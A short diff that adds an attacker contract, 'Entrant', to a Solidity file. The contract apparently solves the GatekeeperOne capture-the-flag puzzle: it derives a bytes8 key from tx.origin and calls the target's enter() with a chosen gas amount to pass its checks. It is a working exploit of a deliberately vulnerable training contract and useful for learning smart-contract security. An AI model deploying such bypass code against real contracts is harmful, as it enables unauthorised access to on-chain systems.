@@ -1,6 +1,21 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
+contract Entrant {
+    GatekeeperOne public gates;
+
+    constructor(GatekeeperOne _gates) {
+        gates = _gates;
+    }
+
+    function open(uint256 _gas) public {
+        bytes8 key;
+        uint256 num = uint16(uint160(tx.origin));
+        key = bytes8(uint64(num + type(uint32).max + 1));
+        gates.enter{gas: _gas}(key);
+    }
+}
+
 contract GatekeeperOne {
     address public entrant;
 
